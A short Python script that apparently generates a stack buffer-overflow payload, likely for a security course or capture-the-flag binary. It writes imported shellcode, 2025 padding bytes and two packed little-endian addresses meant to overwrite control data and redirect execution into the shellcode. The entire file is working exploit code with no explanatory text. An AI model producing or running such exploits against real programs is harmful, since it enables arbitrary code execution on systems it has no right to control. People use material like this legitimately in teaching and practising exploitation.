from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(shellcode + ('\x12'*2025).encode('ASCII') + pack("<I", 0xfffe9018) + pack("<I", 0xfffe984c))